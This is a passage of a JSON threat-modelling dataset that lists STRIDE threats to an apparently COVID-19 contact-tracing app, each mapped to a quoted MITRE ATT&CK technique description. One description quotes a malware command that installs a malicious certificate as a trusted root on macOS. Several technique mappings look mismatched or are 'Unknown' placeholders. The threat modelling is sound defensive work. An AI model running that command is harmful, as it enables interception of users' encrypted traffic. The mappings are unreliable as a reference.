            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A legitimate user exploits their access to administrative credentials to perform unauthorized actions or data modifications.",
            "Assumptions": [
                {
                    "Assumption": "Administrative credentials are not properly managed or monitored.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate credential management."
                },
                {
                    "Assumption": "There's insufficient logging and auditing of administrative actions.",
                    "Role": "Security Team",
                    "Condition": "Lack of logging and monitoring."
                },
                {
                    "Assumption": "The user has a motivation for malicious activities.",
                    "Role": "Insider Threat",
                    "Condition": "Malicious intent or coercion."
                }
            ],
            "Potential Impact": "Unauthorized changes to data and system configurations, compromising integrity and security.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "insider threat",
                "credential misuse"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to manipulate a lower-privileged user into executing privileged actions on their behalf.",
            "Assumptions": [
                {
                    "Assumption": "Users lack awareness of phishing and social engineering tactics.",
                    "Role": "End Users",
                    "Condition": "Insufficient security training."
                },
                {
                    "Assumption": "There are no safeguards to verify the legitimacy of elevated actions.",
                    "Role": "System Administrator",
                    "Condition": "Absence of verification mechanisms."
                },
                {
                    "Assumption": "Administrative tasks can be executed by users without verification.",
                    "Role": "Application Developer",
                    "Condition": "Lax privilege boundaries."
                }
            ],
            "Potential Impact": "Execution of unauthorized actions and potential compromise of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "social engineering",
                "manipulation"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "7",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake mobile application mimicking the legitimate contact tracing app to harvest users' sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Users are not validating the authenticity of the application before installation",
                    "Role": "User",
                    "Condition": "When downloading the application from unofficial sources"
                },
                {
                    "Assumption": "The fake application is sufficiently similar in appearance and function to the real one",
                    "Role": "Attacker",
                    "Condition": "During the development of the fake app"
                },
                {
                    "Assumption": "There are no strong mechanisms to verify application authenticity",
                    "Role": "Mobile Application Developer",
                    "Condition": "In the app distribution and update process"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data including user locations and interactions.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential harvesting",
                "fake app",
                "identity theft",
                "phishing"
            ],
            "mitre_technique": {
                "name": "Application Access Token",
                "description": "Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\n\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)\n\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)\n\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim\u2019s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\n",
                "id": "attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a",
                "technique_id": "T1527"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a user's device identity to inject false contact records into the application.",
            "Assumptions": [
                {
                    "Assumption": "Device identity is based on temporary IDs that can be predicted or replicated",
                    "Role": "Attacker",
                    "Condition": "When generating fake IDs"
                },
                {
                    "Assumption": "Central server or devices do not sufficiently authenticate IDs",
                    "Role": "System",
                    "Condition": "During the validation of contact records"
                },
                {
                    "Assumption": "Affected users are not continuously validating the integrity of their data",
                    "Role": "User",
                    "Condition": "While reviewing their contact history"
                }
            ],
            "Potential Impact": "Corruption or tampering of data leading to false alerts and notifications.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "identity fraud",
                "data injection",
                "contact record manipulation"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses another user's credentials or device to report a false COVID-19 positive case.",
            "Assumptions": [
                {
                    "Assumption": "Users have weak authentication mechanisms",
                    "Role": "User",
                    "Condition": "When setting up authentication methods"
                },
                {
                    "Assumption": "The system does not verify the authenticity of the positive test report",
                    "Role": "Central Server",
                    "Condition": "When processing COVID-19 status updates"
                },
                {
                    "Assumption": "User trust in system notifications without additional confirmation",
                    "Role": "User",
                    "Condition": "Upon receiving exposure notifications"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of potentially incorrect health status leading to mass alerts and panic.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential theft",
                "fake report",
                "notification manipulation"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies stored contact data on a device to either add or remove interactions.",
            "Assumptions": [
                {
                    "Assumption": "Data stored locally is not encrypted or secured",
                    "Role": "Application Developer",
                    "Condition": "During the design of data storage mechanisms"
                },
                {
                    "Assumption": "Attackers have physical or remote access to the user device",
                    "Role": "Attacker",
                    "Condition": "When targeting device vulnerabilities"
                },
                {
                    "Assumption": "No integrity checks are performed on the stored data periodically",
                    "Role": "System",
                    "Condition": "During data usage"
                }
            ],
            "Potential Impact": "Integrity and authenticity of contact history data compromised leading to false exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data manipulation",
                "local storage",
                "device compromise"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and alters data transmitted between user devices and the central server.",
            "Assumptions": [
                {
                    "Assumption": "Data transmissions are not properly encrypted",
                    "Role": "Application Developer",
                    "Condition": "During development of data transmission protocols"
                },
                {
                    "Assumption": "Attacker has access to the communication channel",
                    "Role": "Attacker",
                    "Condition": "When setting up a man-in-the-middle attack"
                },
                {
                    "Assumption": "The central server does not validate the integrity of received data",
                    "Role": "Server",
                    "Condition": "During data processing"
                }
            ],
            "Potential Impact": "Unauthorized modification leading to false data being processed and incorrect alerts being issued.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data interception",
                "man-in-the-middle",
                "transmission security"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with privileged access modifies the application's source code or binary to introduce vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "Development or deployment environments are not secure",
                    "Role": "Application Developer",
                    "Condition": "During the software development lifecycle"
                },
                {
                    "Assumption": "The application distribution process does not include checks for code integrity",
                    "Role": "System",
                    "Condition": "When releasing updates"
                },
                {
                    "Assumption": "Users do not or cannot verify the integrity of the application binary",
                    "Role": "User",
                    "Condition": "When installing or updating the app"
                }
            ],
            "Potential Impact": "Compromise of the application\u2019s functionality leading to potential data breaches and malicious activities.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "code injection",
                "software supply chain",
                "privileged access"
            ],
            "mitre_technique": {
                "name": "Compromise Software Supply Chain",
                "description": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  ",
                "id": "attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00",
                "technique_id": "T1195.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having received or sent certain contact data, potentially disputing exposure notifications.",
            "Assumptions": [
                {
                    "Assumption": "The application does not have adequate logging or auditing mechanisms",
                    "Role": "Application Developer",
                    "Condition": "During the design phase"
                },
                {
                    "Assumption": "Users are not continuously monitored for their interactions or communications",
                    "Role": "System",
                    "Condition": "During regular operations"
                },
                {
                    "Assumption": "There are no effective non-repudiation techniques in place",
                    "Role": "Application Developer",
                    "Condition": "When implementing security features"
                }
            ],
            "Potential Impact": "Difficulty in verifying user claims leading to potential trust issues and misuse of the app.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "audit evasion",
                "data dispute",
                "contact denial"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker logs in as a user and deletes contact history to erase traces of interactions.",
            "Assumptions": [
                {
                    "Assumption": "Weak or compromised authentication mechanisms",
                    "Role": "User",
                    "Condition": "When setting up and using authentication methods"
                },
                {
                    "Assumption": "Users are not regularly monitoring or backing up their contact history",
                    "Role": "User",
                    "Condition": "During app usage"
                },
                {
                    "Assumption": "Application does not log or alert on significant actions such as deletion of data",
                    "Role": "Application Developer",
                    "Condition": "When designing application logging mechanisms"
                }
            ],
            "Potential Impact": "Loss of critical exposure data leading to ineffective contact tracing and delayed response.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data deletion",
                "log evasion",
                "user impersonation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user or attacker refutes having logged a positive COVID-19 test on the application, questioning the validity of alerts sent.",
            "Assumptions": [
                {
                    "Assumption": "No effective logging mechanisms for positive test reports",
                    "Role": "System",
                    "Condition": "During report submissions"
                },
                {
                    "Assumption": "Users do not receive confirmations or receipts upon submitting test results",
                    "Role": "User",
                    "Condition": "When updating their COVID-19 status"
                },
                {
                    "Assumption": "The application does not enforce strong non-repudiation techniques",
                    "Role": "Application Developer",
                    "Condition": "When implementing state change controls"
                }
            ],
            "Potential Impact": "Disruption in the trust and effectiveness of the app leading to potential public health risks.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "test result dispute",
                "audit log",
                "state change"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive location and contact data is leaked due to unsecured storage on user devices.",
            "Assumptions": [
                {
                    "Assumption": "Data stored locally is not encrypted",
                    "Role": "Application Developer",
                    "Condition": "When implementing local storage mechanisms"
                },
                {
                    "Assumption": "Users may grant excessive permissions to other apps",
                    "Role": "User",
                    "Condition": "When managing app permissions"
                },
                {
                    "Assumption": "Device security configurations are weak or compromised",
                    "Role": "User",
                    "Condition": "In user device settings"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data leading to privacy breaches and potential misuse.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "data leak",
                "local storage",
                "permission misuse"
            ],
            "mitre_technique": {
                "name": "Local Data Staging",
                "description": "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)",
                "id": "attack-pattern--1c34f7aa-9341-4a48-bfab-af22e51aca6c",
                "technique_id": "T1074.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Intercepted Bluetooth communications between devices reveal proximity data to unauthorized parties.",
            "Assumptions": [
                {
                    "Assumption": "Bluetooth communications are not encrypted",
                    "Role": "Application Developer",
                    "Condition": "During the setup of data exchange protocols"
                },
                {
                    "Assumption": "An attacker can physically be in range to intercept communications",
                    "Role": "Attacker",
                    "Condition": "During device interactions"
                },
                {
                    "Assumption": "Users are unaware of the need to secure their device communications",
                    "Role": "User",
                    "Condition": "During regular device use"
                }
            ],
            "Potential Impact": "Sensitive information regarding user interaction and location could be exploited.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "communication interception",
                "Bluetooth",
                "proximity data"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An unauthorized entity accesses and exfiltrates contact data from the central server.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate access controls on the central server",
                    "Role": "System Administrator",
                    "Condition": "During server configuration"
                },
                {
                    "Assumption": "High-value targets are not monitored or protected sufficiently",
                    "Role": "Security Team",
                    "Condition": "During regular security operations"
                },
                {
                    "Assumption": "No encryption is applied to sensitive data stored on the server",
                    "Role": "Application Developer",
                    "Condition": "During data storage implementation"
                }
            ],
            "Potential Impact": "Exposure of vast amounts of sensitive data leading to significant privacy and security risks.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "server infiltration",
                "data exfiltration",
                "access control"
            ],
            "mitre_technique": {
                "name": "Scheduled Transfer",
                "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\n\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
                "id": "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466",
                "technique_id": "T1029"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the central server with excessive contact data submissions, overwhelming it and causing downtime.",
            "Assumptions": [
                {
                    "Assumption": "The server does not have effective rate limiting or anomaly detection mechanisms",
                    "Role": "System Administrator",
                    "Condition": "During server configuration"
                },
                {
                    "Assumption": "The infrastructure cannot handle large amounts of traffic",
                    "Role": "System Architect",
                    "Condition": "In system design"
                },
                {
                    "Assumption": "Users rely on real-time updates from the server to manage exposures",
                    "Role": "User",
                    "Condition": "When using the application for exposure notifications"
                }
            ],
            "Potential Impact": "Disruption to the service causing delays or loss in functionality, impacting the effectiveness of contact tracing.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flooding",
                "server overload",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the mobile application with a large number of invalid requests, causing it to crash or slow down.",
            "Assumptions": [
                {
                    "Assumption": "The application does not handle input validation effectively",
                    "Role": "Application Developer",
                    "Condition": "During the implementation of input handling"
                },
                {
                    "Assumption": "Attackers have the capability to generate a large volume of requests",
                    "Role": "Attacker",
                    "Condition": "When deploying attack tools"
                },
                {
                    "Assumption": "Users rely on the application for timely exposure alerts",
                    "Role": "User",
                    "Condition": "During regular app use"
                }
            ],
            "Potential Impact": "Reduced availability and performance of the mobile app leading to delayed health alerts.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "application crash",
                "invalid requests",
                "performance degradation"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker uses a botnet to launch a DDoS attack on the service server, rendering it unavailable.",
            "Assumptions": [
                {
                    "Assumption": "The server is exposed to the internet without strong protective measures",
                    "Role": "System Administrator",
                    "Condition": "During server configuration"
                },
                {
                    "Assumption": "There is no scalable infrastructure to manage large-scale attacks",
                    "Role": "System Architect",
                    "Condition": "During system design"
                },
                {
                    "Assumption": "Users rely on server availability for exposure data updates",
                    "Role": "User",
                    "Condition": "When syncing their app with the server"
                }
            ],
            "Potential Impact": "Severe disruption of the service making contact tracing and exposure notifications ineffective.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "distributed attack",
                "botnet",
                "server unavailability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability to gain admin access on the server, enabling modification of contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "The server has unpatched vulnerabilities",
                    "Role": "System Administrator",
                    "Condition": "During regular maintenance and patching"
                },
                {
                    "Assumption": "Insufficient monitoring of privileged activities on the server",
                    "Role": "Security Team",
                    "Condition": "During regular operations"
                },
                {
                    "Assumption": "The attacker has knowledge of server configurations and potential weaknesses",
                    "Role": "Attacker",
                    "Condition": "When planning and executing the attack"
                }
            ],
            "Potential Impact": "Integrity of contact data compromised leading to unreliable notifications and potential spread of misinformation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "admin access",
                "server exploitation",
                "data modification"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A local user escalates their privileges on their device to access other users' contact logs stored locally.",
            "Assumptions": [
                {
                    "Assumption": "The application does not employ sufficient access controls for sensitive data",
                    "Role": "Application Developer",
                    "Condition": "During app development"
                },
                {
                    "Assumption": "The attacker has initial access to the device",
                    "Role": "Attacker",
                    "Condition": "When exploiting local vulnerabilities"
                },
                {
                    "Assumption": "Users store significant amounts of sensitive contact data on their devices",
                    "Role": "User",
                    "Condition": "During app usage"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of contact history leading to privacy violations and potential misuse of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "local access",
                "data breach",
                "contact logs"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits weaknesses in the mobile application to gain elevated privileges and manipulate the app's functionality.",
            "Assumptions": [
                {
                    "Assumption": "The mobile application has known or unknown security vulnerabilities",
                    "Role": "Application Developer",
                    "Condition": "When coding and testing the app"
                },
                {
                    "Assumption": "The attacker has access to tools and methods to exploit these vulnerabilities",
                    "Role": "Attacker",
                    "Condition": "During the attack planning phase"
                },
                {
                    "Assumption": "Users rely heavily on the app for accurate and timely information",
                    "Role": "User",
                    "Condition": "During regular use"
                }
            ],
            "Potential Impact": "Manipulation of app behavior leading to unreliable contact tracing data and potential harm.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "mobile app exploit",
                "functionality manipulation",
